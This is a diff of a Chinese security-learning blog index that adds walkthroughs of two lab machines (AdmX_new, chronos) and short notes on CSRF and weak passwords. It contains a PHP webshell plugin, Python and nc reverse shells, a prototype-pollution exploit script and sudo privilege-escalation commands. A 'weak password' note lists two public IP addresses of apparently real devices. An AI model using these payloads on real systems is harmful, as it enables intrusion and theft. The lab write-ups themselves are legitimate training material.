@@ -43,7 +43,7 @@
     <h2 class="author">John Doe</h2>
     <h3 class="description"></h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>53</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>1</strong><br>标签</div></a>
     </div>
@@ -71,6 +71,830 @@
 
         <section id="main">
   
+    <article id="post-靶机/45-靶机AdmX_new/45-靶机AdmX_new" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/" class="article-date">
+  <time class="post-time" datetime="2024-02-28T08:02:46.000Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br/>
+    <span class="post-day">28</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/">45.靶机AdmX_new</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>靶机AdmX_new</p>
+<p>信息收集</p>
+<p>进行主机的发现，由于已知主机跟Kali在同一NAT模式网段下 ,所以使用 arp-scan 工具扫描ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228095238117.png" alt="image-20240228095238117"></p>
+<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.137.130</span><br></pre></td></tr></table></figure>
+
+<p>发现靶机上只开了80端口</p>
+<p><img src="/45-BJ.assets/image-20240228095756503.png" alt="image-20240228095756503"></p>
+<p>访问192.168.137.130</p>
+<p><img src="/45-BJ.assets/image-20240228095836462.png" alt="image-20240228095836462"></p>
+<p>出现Apache2 Ubuntu Default Page</p>
+<p>可能存在Web 前端部署在 Ubuntu 上</p>
+<p>扫描下目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.137.130&quot; -x 403,404</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228104137253.png" alt="image-20240228104137253"></p>
+<p>发现有wordpress访问与wp-login.php登录页面</p>
+<p>访问192.168.137.130&#x2F;wordpress</p>
+<p><img src="/45-BJ.assets/image-20240228104331025.png" alt="image-20240228104331025"></p>
+<p>页面加载不完全</p>
+<p><img src="/45-BJ.assets/image-20240228104520172.png" alt="image-20240228104520172"></p>
+<p>三个js加载错误</p>
+<p>该页面经过长时间的加载始终无法完成，所以需要通过Burp抓包分析网站加载过程</p>
+<p>burpsuite抓包</p>
+<p><img src="/45-BJ.assets/image-20240228104824916.png" alt="image-20240228104824916"></p>
+<p>通过Burp抓包分析发现，该站点加载过程中会向<code>192.168.159.145</code>申请加载JS资源，故造成站点加载速度慢</p>
+<p>请求ip不对在Burp做设置替换规则</p>
+<p>响应头部和响应体中替换规则192.168.159.145为192.168.137.130</p>
+<p><img src="/45-BJ.assets/image-20240228142259320.png" alt="image-20240228142259320"></p>
+<p>刷新后页面加载正常</p>
+<p><img src="/45-BJ.assets/image-20240228142356999.png" alt="image-20240228142356999"></p>
+<p>在前台页面并没发现更多的漏洞，但是有告诉我们一个admin的名称</p>
+<p>尝试用admin登陆下wp-login.php的WordPress后台管理地址</p>
+<p>访问192.168.137.130&#x2F;wordpress&#x2F;wp-login.php</p>
+<p><img src="/45-BJ.assets/image-20240228142520681.png" alt="image-20240228142520681"></p>
+<p>经测试，该登录入口不存在SQL注入（万能密码）漏洞，故采用暴力破解</p>
+<p>测试用户是否存在</p>
+<p>输入正确的用户名时：提示密码错误</p>
+<p>输入不存在的用户名时：提示用户名不知道</p>
+<p>开始密码爆破</p>
+<p>使用Burp截获提交登录密码的包</p>
+<p><img src="/45-BJ.assets/image-20240228142726003.png" alt="image-20240228142726003"></p>
+<p>添加字典尝试密码爆破</p>
+<p>发送到Intruder，只对密码进行破解</p>
+<p><img src="/45-BJ.assets/image-20240228143010860.png" alt="image-20240228143010860"></p>
+<p>设置Payload，加载<code>MidPwds.txt</code>密码字典</p>
+<p><img src="/45-BJ.assets/image-20240228143029581.png" alt="image-20240228143029581"></p>
+<p>经测试，密码为adam14</p>
+<p>登录管理员账户，查看后台管理页面，查看WordPress版本为5.7.1，主题为Twenty Twenty-One</p>
+<p>WordPress系统GetShell（3种方法）</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1- Media-&gt;Add New-&gt;上传Shell</span><br><span class="line"></span><br><span class="line">2- Appearance-&gt;Edit Themes-&gt;404Template-&gt;直接写入一句话木马eavl($_POST[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line">3- Plugins-&gt;Add New-&gt;Upload Plugin-&gt;上传一个自己手写的插件</span><br></pre></td></tr></table></figure>
+
+<p>  使用上传手写插件</p>
+<p>创建文件shell.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cat shell.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Plugin Name: Webshell</span><br><span class="line"> * Plugin URI: https://qzc.github.io</span><br><span class="line"> * Description: WP Wehshell for Pentest</span><br><span class="line"> * Version: 1.0</span><br><span class="line"> * Author: qzc</span><br><span class="line"> * Author URI: https://qzc.github.io</span><br><span class="line"> * License: https://qzc.github.io</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">        &#123;</span><br><span class="line">                system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">        &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>压缩</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip shell.zip shell.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228144936605.png" alt="image-20240228144936605"></p>
+<p>上传</p>
+<p><img src="/45-BJ.assets/image-20240228150537837.png" alt="image-20240228150537837"></p>
+<p>激活访问一下上传的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.130/wordpress/wp-content/plugins/shell.php?cmd=id</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228151004588.png" alt="image-20240228151004588"></p>
+<p>已经实现系统命令执行</p>
+<p>开始反弹Shell</p>
+<p>kali主机监听5555端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 5555</span><br></pre></td></tr></table></figure>
+
+<p>测试靶机上是否存在nc、python3</p>
+<p><img src="/45-BJ.assets/image-20240228151228870.png" alt="image-20240228151228870"></p>
+<p><img src="/45-BJ.assets/image-20240228151251511.png" alt="image-20240228151251511"></p>
+<p>存在nc与python3</p>
+<p>反弹成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.130/wordpress/wp-content/plugins/shell.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.137.128%22,5555));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228151701784.png" alt="image-20240228151701784"></p>
+<p>用Python3反弹Shell</p>
+<p>在404模板页面写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd wp-content/themes/twentytwentyone</span><br><span class="line">vi 404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228151904979.png" alt="image-20240228151904979"></p>
+<p>功能有缺陷，vi编辑器无法显示</p>
+<p>升级Shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br><span class="line">ctrl +z </span><br><span class="line">stty raw -echo;fg;reset </span><br></pre></td></tr></table></figure>
+
+<p>可以正常使用</p>
+<p>编辑404.php，加入一句话木马</p>
+<p><img src="/45-BJ.assets/image-20240228154614982.png" alt="image-20240228154614982"></p>
+<p>使用蚁剑连接Shell</p>
+<p>连接地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.130/wordpress/wp-content/themes/twentytwentyone/404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228155017188.png" alt="image-20240228155017188"></p>
+<p>连接成功</p>
+<p>关于Shell的建议</p>
+<p>Tip：一般系统的Shell都较难获取，一但获取某个Shell权限后，建议多种方式，多挣途径，多准备几个Shell，以防Shell权限丢失</p>
+<p>系统提权</p>
+<p>前期通过系统信息收集该系统存在wpadmin账户，内核版本5.4无法提权</p>
+<p>通过WordPress配置文件找到了数据库配置文件，找到数据库连接密码</p>
+<p><img src="/45-BJ.assets/image-20240228155137455.png" alt="image-20240228155137455"></p>
+<p>连接数据库用户名<code>admin</code>、密码：<code>Wp_Admin#123</code></p>
+<p>尝试切换wpadmin，并使用adam14密码登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su wpadmin</span><br><span class="line">密码adam14</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228155448103.png" alt="image-20240228155448103"></p>
+<p>在wpadmin获取第一个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat local.txt</span><br></pre></td></tr></table></figure>
+
+<p>查询用户权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>该用户不需要密码 sudo mysql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
+
+<p>输入密码adam14</p>
+<p><img src="/45-BJ.assets/image-20240228155628760.png" alt="image-20240228155628760"></p>
+<p>成功登录数据库</p>
+<p>Mysql提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system id</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system /bin/bash</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat proot.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/45-BJ.assets/image-20240228155759448.png" alt="image-20240228155759448"></p>
+<p>完成</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/" data-id="cltmognaw00069wu4herhfafe" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-靶机/44-靶机chronos.assets/44-靶机chronos" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/" class="article-date">
+  <time class="post-time" datetime="2024-02-27T12:42:55.000Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br/>
+    <span class="post-day">27</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/">44.靶机chronos</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>靶机chronos</p>
+<p>信息收集</p>
+<p>进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204432829.png" alt="image-20240227204432829"></p>
+<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p>发现靶机上开了3个端口</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204632520.png" alt="image-20240227204632520"></p>
+<p>识别靶机端口开放的服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,8000,80 -sV 192.168.56.101 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204726647.png" alt="image-20240227204726647"></p>
+<p>访问192.168.56.101 </p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204836245.png" alt="image-20240227204836245"></p>
+<p>没有东西</p>
+<p>查看页面源代码</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205007063.png" alt="image-20240227205007063"></p>
+<p>发现一个url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+<p>结合端口扫描获取信息（目标靶机开启8000端口），通过对以上URL的分析，<code>chronos.local</code>很有可能就是目标靶机本身，并通过data?format&#x3D;获取了系列资源</p>
+<p>kali本地hosts绑定chronos.local域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br><span class="line">a模式插入</span><br><span class="line">192.168.56.101 chronos.local</span><br></pre></td></tr></table></figure>
+
+<p>再次刷新192.168.56.101 ，页面发生变化</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205306561.png" alt="image-20240227205306561"></p>
+<p>发现时间是变化的</p>
+<p>怀疑是命令执行，对获取系统时间有直接作用</p>
+<p>用Burp记录网站加载过程进行抓包</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205540583.png" alt="image-20240227205540583"></p>
+<p>通过Burp-Repeater测试GET参数</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227211758273.png" alt="image-20240227211758273"></p>
+<p>错误信息中显示了是base58编码</p>
+<p>研究下4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL </p>
+<p>使用CyberChef工具由Base58解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CyberChef工具地址https://icyberchef.com/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>结合网页收集的信息，该参数和date输出参数很相似</p>
+<p>有理由猜测该Web应用程序执行的是操作系统指令</p>
+<p>尝试注入</p>
+<p>Linux系统命令拼接符号：|、；、&amp;</p>
+<p>A||B表示：A执行失败，执行B</p>
+<p>A&amp;&amp;B表示：A执行成功，执行B</p>
+<p>如果在系统执行命令下后拼接ls命令&amp;&amp;ls，那么系统应该应该列出当前目录中的文件</p>
+<p>base58(&amp;&amp;ls)&#x3D;yZSGA </p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212143452.png" alt="image-20240227212143452"></p>
+<p>查询是否存在nc</p>
+<p>base58(&amp;&amp;ls &#x2F;bin)&#x3D;VAZYW9RHPu6D</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212243578.png" alt="image-20240227212243578"></p>
+<p>在右边结果中发现有nc</p>
+<p>测试nc功能是否正常</p>
+<p>base58(&amp;&amp;nc 192.168.56.102 5555)&#x3D;4UiiY6bkrF7pai4b23hZFghvcmyKsBStt</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212835573.png" alt="image-20240227212835573"></p>
+<p>可以建立连接</p>
+<p>使用nc串联方法反弹连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base58(&amp;&amp;nc 192.168.56.102 5555 | /bin/bash | nc 192.168.56.102 6666)=Wqif9Y5HMzQyibWE2TNtxFv2gSUAxAWHVyd7AZxbL2cpEXzRor13WdyY1nfFTeS65EBMdTTrqbfqjcqEhvm</span><br></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227213216647.png" alt="image-20240227213216647"></p>
+<p>系统信息收集<br>查看系统账号，发现存在imera账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">id</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214611219.png" alt="image-20240227214611219"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/imera</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214715730.png" alt="image-20240227214715730"></p>
+<p>尝试三种常用的提权方法都无法使用：1、内核漏洞；2、suid提权；3、sudo配置错误</p>
+<p>代码审计</p>
+<ol>
+<li>查看网站根的package.json源码，依赖的组件</li>
+<li>再次查看app.js源码，且有相关命令的检测，但没有过滤，确认存在命令执行漏洞，没有找到更多的提权信息</li>
+<li>返回上级目录发现了chronos-v2目录，进入chronos-v2&#x2F;backend目录，发现package.json和server.js文件</li>
+<li>通过对&#x2F;opt&#x2F;chronos-v2&#x2F;backend&#x2F;server.js文件进行审计，发现靶机在127.0.0.1:8080监听的有一个应用</li>
+<li>通过对&#x2F;opt&#x2F;chronos-v2&#x2F;backend&#x2F;package.json文件进行审计，发现fileupload({ parseNested: true }以及”express-fileupload”: “^1.1.7-alpha.3”</li>
+<li>通过多方搜索，发现靶机express-fileupload版本存在提权漏洞</li>
+</ol>
+<p>进行系统用户提权</p>
+<ul>
+<li>Kali主机创建py脚本vi python</li>
+<li>参照<a target="_blank" rel="noopener" href="https://blog.p6.is/Real-World-JS-1/%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC">https://blog.p6.is/Real-World-JS-1/写入攻击脚本</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.56.102/7777 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"># pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line"># execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>启动http server，将<code>exp.py</code>写入靶机</p>
+<p>Kali主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget -c http://192.168.56.102/exp.py</span><br></pre></td></tr></table></figure>
+
+<p>启动监听端口，执行exp.py反弹Shell</p>
+<p>Kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>
+
+<p>Shell反弹成功，imera用户</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227220454069.png" alt="image-20240227220454069"></p>
+<p>获取用户Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+
+<p>Root用户提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>sudo node提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;, &#123;stdio:[0,1,2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>获取root用户Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/" data-id="cltmognax00089wu438qyb35c" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-CSRF和SSRF" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/02/20/CSRF%E5%92%8CSSRF/" class="article-date">
+  <time class="post-time" datetime="2024-02-20T11:32:23.000Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br/>
+    <span class="post-day">20</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/02/20/CSRF%E5%92%8CSSRF/">CSRF和SSRF</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h3><p>CSRF 危害： ●修改个人信息&#x2F;帐号密码 ●发送伪造的业务请求 ●关注他人的社交帐号,推送博文 ●在用户非自愿,不知情的情况下提交请求 ●获取信用卡等信息 </p>
+<p>触发条件： ①用户某一网站处于登陆状态（即身份验证状态暂未过期） ②用户访问了一黑客精心构造的带有特殊url访问请求的网站 ③服务器无二次身份验证机制 </p>
+<p>漏洞核心： 服务器对用户身份验证不够严格（即缺少二次验证（二次验证加入验证码）或者特殊的身份验证（token）） </p>
+<p>漏洞验证： 一般在用户信息更新页面，利用Burpsuite抓包，利用工具内部的功能生成CSRF的POC（这个POC也可以自定义），然后将生成的HTML代码放在一公网服务器下，由用户访问然后查看确认最后是否触发漏洞。 防御方法： 1设置随机Token。如果设置这个参数就不存在漏洞，一般在数据包中就可以直接判断出。（推荐这个） 2检测referer来源。但是一般可伪造。<br>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82918141">DVWA之CSRF(跨站请求伪造攻击)</a> | [CSRF(跨站请求伪造)](<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/82820115#%EF%BC%881%EF%BC%89%E9%AA%8C%E8%AF%81">https://blog.csdn.net/qq_36119192/article/details/82820115#（1）验证</a> HTTP Referer 字段     ) | <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/118352.html">新手指南：DVWA-1.9全级别教程之CSRF</a></p>
+<h3 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF(服务器端请求伪造)"></a>SSRF(服务器端请求伪造)</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/20/CSRF%E5%92%8CSSRF/" data-id="cltmognas00029wu41h9j7ert" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-title = switch and body = elec" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/02/06/title%20=%20switch%20and%20body%20=%20elec/" class="article-date">
+  <time class="post-time" datetime="2024-02-06T10:00:28.933Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br/>
+    <span class="post-day">06</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>title &#x3D; “switch” and body &#x3D; “elec” </p>
+<p>router</p>
+<p>csrf  服务端过度相信客户端</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/06/title%20=%20switch%20and%20body%20=%20elec/" data-id="cltmognar00019wu4gqpy5ylx" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-弱密码" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/01/31/%E5%BC%B1%E5%AF%86%E7%A0%81/" class="article-date">
+  <time class="post-time" datetime="2024-01-31T01:11:00.079Z" itemprop="datePublished">
+    <span class="post-month">1月</span><br/>
+    <span class="post-day">31</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>web-static</p>
+<p><a target="_blank" rel="noopener" href="http://79.52.187.38/web/index.html">http://79.52.187.38/web/index.html</a></p>
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240130155503184.png" alt="image-20240130155503184"></p>
+<p><a target="_blank" rel="noopener" href="http://2.44.62.125/web/index.html">http://2.44.62.125/web/index.html</a></p>
